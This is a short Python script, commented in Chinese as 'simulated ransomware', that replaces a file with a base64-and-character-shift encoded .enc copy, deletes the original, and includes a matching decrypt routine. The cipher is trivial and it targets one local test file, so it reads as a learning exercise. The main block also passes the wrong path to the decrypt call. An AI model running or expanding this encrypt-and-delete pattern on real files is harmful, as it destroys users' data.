# 模拟勒索病毒（文件加密）
import base64
import os


def LS_encrypt(filepath):
    with open(filepath, mode='rb') as file:
        data = file.read()
    source = base64.b64encode(data).decode()
    dest = ''
    for c in source:
        dest += chr(ord(c)+5)
    # 将加密字符串保存到文件中
    with open(filepath + '.enc', mode='w') as file:
        file.write(dest)
    # 删除原始文件
    os.remove(filepath)

    print("已经加密"+filepath)
# 解密
def LS_decrypt(filepath):
    with open(filepath, mode='r') as file:
        content = file.read()
    dest = ''
    for c in content:
        dest += chr(ord(c)-5)
    newfile = filepath.replace('.enc', '')
    with open(newfile, mode='wb') as file:
        file.write(base64.b64decode(dest))
    # 删除加密文件
    os.remove(filepath)

    print("已经解密" + filepath)
if __name__ == '__main__':
    file1 = 'D:/python_projects/lesuo_virus/test.txt'
    file2 = 'D:/python_projects/lesuo_virus/test.enc'
    LS_decrypt(file1)
    # LS_decrypt(file2)